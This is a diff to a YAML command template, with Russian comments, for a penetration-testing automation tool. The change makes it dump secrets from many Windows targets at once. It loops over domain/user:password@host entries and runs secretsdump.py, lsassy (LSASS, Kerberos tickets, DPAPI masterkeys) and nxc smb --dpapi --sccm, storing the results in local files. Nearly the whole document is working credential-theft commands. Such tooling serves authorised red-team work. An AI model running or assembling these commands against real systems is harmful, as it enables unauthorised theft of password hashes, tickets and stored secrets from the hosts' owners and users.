@@ -1,40 +1,78 @@
 description: |-
-  Запускает secretsdump на множество целей
+  Дампит секреты с множества целей
+
+  Запускать в подготовленной директории - будет создавать файлы!
 author: vinzekatze
 
 tags:
-  - secretsdump.py
+  - LSASS
+  - LSA
+  - SAM
+  - DPAPI
+  - dump secrets
 
 arguments:
   targets:
     multiple: true
     description: >-
       [[domain/]username[:password]@]<targetName or address> и/или файлы с такими строками
-  log:
-    default:
-      - a
-      - b
-    description: >- 
-      записывать результаты для каждого таргета в отдельный файл в директории запуска
-    replacer: '#OUTFILE-MECH#'
+  secdump-dir:
+    default: ./secretsdump
+    description: директория, куда будет складывать файлы secretsdump
+    metavar: DIR
+    replacer: '#secdump-dir#'
+  lsassy-dir:
+    default: ./lsassy
+    description: директория, куда будет складывать файлы lsassy
+    metavar: DIR
+    replacer: '#lsassy-dir#'
+  nxc-log:
+    default: ./nxcdump.log
+    description: файл, куда будет писать nxc
+    metavar: FILE
+    replacer: '#nxc-log#'
 
 mode:
   format:
     targets: '{!r}'
+    secdump-dir: '{!r}'
+    nxc-log: '{!r}'
   loop: targets
-  replace:
-    log:
-      a: >-
-        echo 'secretsdump.py "$targ"';
-      b: >-
-        secretsdump.py "$targ" -outputfile $(echo "${targ#*@}-${targ%:*}.secdump.txt" | sed -e 's/[^A-Za-z0-9._-]/_/g');
+    
 
 shell: bash
+item_1:
+  description: запуск secretsdump
+  script: >-
+    echo -e "\e[1;92mStarting secretsdump...\e[0m";
+    mkdir -p #secdump-dir#;
+    for targ in $(cat #targets# 2>/dev/null || echo #targets#); do 
+    echo -en "\e[1;91mTarget: \e[0m"; echo "${targ##*@} (${targ%%:*})";
+    filename=#secdump-dir#/"$(echo "${targ##*@}-${targ%%:*}.secdump" | sed -e 's/[^A-Za-z0-9._-]/_/g')";
+    secretsdump.py "$targ" -outputfile "$filename";
+    echo; done
 
-script: >-
-  for targ in $(cat #targets# 2>/dev/null || echo #targets#); do 
-  echo -en "\e[1;91mTarget: \e[0m"; echo "${targ#*@} (${targ%:*})";
-  #OUTFILE-MECH#
-  echo; done
+item_2:
+  description: запуск lsassy
+  script: >-
+    echo -e "\e[1;92mStarting lsassy...\e[0m";
+    mkdir -p #lsassy-dir#;
+    ticketsdir=#lsassy-dir#/'tickets';
+    masterkeyfile=#lsassy-dir#/masterkeys.txt;
+    for targ in $(cat #targets# 2>/dev/null || echo #targets#); do
+    echo -en "\e[1;91mTarget: \e[0m"; echo "${targ##*@} (${targ%%:*})";
+    filename=#lsassy-dir#/"$(echo "${targ##*@}-${targ%%:*}.lsassy" | sed -e 's/[^A-Za-z0-9._-]/_/g')";
+    targip=${targ##*@}; targdomain=${targ%%/*}; targpreuser=${targ%%:*}; targuser=${targpreuser#*/}; targprepass=${targ%@*}; targpass=${targprepass#*:};
+    lsassy -nc -d "$targdomain" -u "$targuser" -p "$targpass" -o "$filename" -K "$ticketsdir" -M "$masterkeyfile" "$targip";
+    echo; done
 
-
+item_3:
+  description: запуск nxc --dpapi --sccm
+  script: >-
+    echo -e "\e[1;92mStarting nxc...\e[0m";
+    for targ in $(cat #targets# 2>/dev/null || echo #targets#); do
+    echo -en "\e[1;91mTarget: \e[0m"; echo "${targ##*@} (${targ%%:*})";
+    targip=${targ##*@}; targdomain=${targ%%/*}; targpreuser=${targ%%:*}; targuser=${targpreuser#*/}; targprepass=${targ%@*}; targpass=${targprepass#*:};
+    filename=#nxc-log#;
+    nxc smb "$targip" -u "$targdomain"'\'"$targuser" -p "$targpass" --dpapi --sccm --log #nxc-log#;
+    echo; done
